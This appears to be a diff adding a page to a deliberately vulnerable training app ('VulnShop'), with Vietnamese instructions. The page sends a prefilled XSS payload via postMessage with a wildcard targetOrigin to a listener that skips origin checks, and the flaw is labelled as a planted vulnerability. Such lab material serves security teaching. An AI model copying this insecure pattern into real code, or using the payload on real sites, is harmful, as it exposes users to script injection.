@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+  <head>
+    <title>postMessage sender (#28)</title>
+    <style>
+      body { background: #0d1117; color: #e6edf3; font-family: system-ui; padding: 20px; }
+      input, button { padding: 6px; margin: 4px 0; }
+    </style>
+  </head>
+  <body>
+    <h1>postMessage sender</h1>
+    <p>
+      Trang VulnShop <code>/postmessage</code> lắng nghe <code>message</code> event
+      <b>không kiểm tra</b> <code>event.origin</code>. Mở trang đó (nút bên dưới),
+      quay lại đây và bấm gửi — listener sẽ render payload của bạn.
+    </p>
+    <button onclick="w = window.open('/postmessage', '_blank')">1. Mở trang listener</button>
+    <br />
+    <input id="msg" value='<img src=x onerror=alert(document.domain)>' style="width: 70%" />
+    <br />
+    <button onclick="send()">2. Gửi payload tới listener</button>
+    <pre id="out"></pre>
+    <script>
+      function send() {
+        if (!window.w || w.closed) {
+          document.getElementById("out").textContent = "Hãy mở trang listener trước (bước 1).";
+          return;
+        }
+        // [VULN #28] no targetOrigin restriction (should be same-origin URL)
+        w.postMessage(document.getElementById("msg").value, "*");
+        document.getElementById("out").textContent = "Đã gửi postMessage tới listener.";
+      }
+    </script>
+  </body>
+</html>
